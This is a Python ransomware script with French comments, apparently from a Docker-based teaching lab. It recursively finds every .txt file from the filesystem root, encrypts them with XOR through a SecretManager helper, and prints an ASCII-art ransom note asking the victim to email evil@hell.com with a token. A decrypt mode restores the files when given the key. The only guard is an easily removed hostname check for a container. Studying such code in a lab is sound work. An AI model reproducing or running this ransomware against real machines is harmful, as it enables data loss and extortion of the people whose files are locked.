import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager

CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                            
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""

class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self) -> None:
        """
        Vérifie si le programme tourne bien dans un conteneur Docker.
        Si ce n'est pas le cas, il s'arrête immédiatement.
        """
        hostname = socket.gethostname()
        if not re.match("[0-9a-f]{6,6}", hostname):
            print(f"Vous devez exécuter le ransomware dans un conteneur Docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, file_extension: str) -> list:
        """
        Récupère la liste des fichiers correspondant à l'extension donnée,
        en retournant leur chemin absolu trié par ordre alphabétique.
        """
        return sorted(Path('/').rglob(f"*{file_extension}"))

    def encrypt(self) -> None:
        """
        Processus principal du ransomware :
        - Recherche les fichiers .txt
        - Initialise le gestionnaire de secrets
        - Configure les éléments cryptographiques
        - Chiffre les fichiers
        - Affiche le message contenant le token de déchiffrement
        """
        # Trouver les fichiers .txt
        files_list = self.get_files(".txt")
        
        # Initialiser le gestionnaire de secrets
        secret_manager = SecretManager()
        
        # Exécuter la configuration
        secret_manager.setup()

        # Chiffrer les fichiers
        secret_manager.xorfiles(files_list)
        
        # Afficher le message pour la victime
        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))

    def decrypt(self) -> None:
        """
        Processus de déchiffrement :
        - Charge les éléments cryptographiques locaux
        - Demande la clé à la victime
        - Vérifie la clé et déchiffre les fichiers si elle est correcte
        - Supprime les traces du ransomware
        """
        # Trouver les fichiers chiffrés
        files_list = self.get_files(".txt")

        # Initialiser le gestionnaire de secrets
        secret_manager = SecretManager()

        # Charger le sel et le token depuis les fichiers locaux
        secret_manager.load()

        # Boucle jusqu'à obtention de la bonne clé
        while True:
            try:
                # Demander la clé à l'utilisateur
                b64_key = input("Saisissez la clé de déchiffrement : ")
                
                # Vérifier et définir la clé
                secret_manager.set_key(b64_key)
                
                # Déchiffrer les fichiers
                secret_manager.xorfiles(files_list)
                
                # Supprimer les traces du ransomware
                secret_manager.clean()
                
                # Informer la victime du succès
                print("Les fichiers ont été restaurés avec succès !")
                break
            
            except Exception as e:
                print(f"Clé incorrecte : {e}. Veuillez réessayer.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    ransomware = Ransomware()
    
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        ransomware.decrypt()
    else:
        ransomware.encrypt()
